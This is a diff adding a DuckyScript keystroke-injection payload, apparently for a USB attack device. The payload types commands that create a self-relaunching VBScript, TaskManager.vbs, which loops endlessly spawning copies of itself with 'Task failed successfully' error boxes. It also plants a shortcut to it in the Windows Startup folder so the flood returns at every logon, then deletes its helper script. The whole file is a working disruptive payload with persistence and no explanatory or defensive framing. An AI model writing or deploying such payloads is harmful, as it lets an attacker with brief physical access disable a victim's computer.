@@ -1,0 +1,48 @@
+DELAY 1000
+ESC
+DELAY 300
+GUI r
+DELAY 300
+STRING shell:startup
+ENTER
+DELAY 1500
+F4
+CTRL a
+CTRL x
+STRING cmd
+ENTER
+DELAY 2000
+ALT TAB
+DELAY 500
+ALT F4
+DELAY 1000
+STRING mode con cols=20 lines=1
+ENTER
+STRING cd .. & 
+STRING echo Set oShell = CreateObject ("WScript.Shell") > TaskManager.vbs & 
+STRING echo Do >> TaskManager.vbs & 
+STRING echo x=msgbox("Task failed successfully" ,0+16, "Error") >> TaskManager.vbs & 
+STRING echo oShell.run "TaskManager.vbs" >> TaskManager.vbs & 
+STRING echo Loop >> TaskManager.vbs & 
+STRING TaskManager.vbs & 
+STRING echo Set oWS = WScript.CreateObject("WScript.Shell") > SC.vbs & 
+STRING echo sLinkFile = "
+CTRL v
+STRING \TaskManager.lnk" >> SC.vbs & 
+STRING echo Set oLink = oWS.CreateShortcut(sLinkFile) >> SC.vbs & 
+STRING echo oLink.TargetPath = "
+CTRL v
+BACKSPACE
+REPEAT 6
+STRING TaskManager.vbs" >> SC.vbs & 
+STRING echo oLink.WorkingDirectory = "
+CTRL v
+BACKSPACE
+REPEAT 7
+STRING " >> SC.vbs & 
+STRING echo oLink.Save >> SC.vbs & 
+STRING start SC.vbs & 
+STRING timeout 1 & 
+STRING del SC.vbs & 
+STRING exit
+ENTER
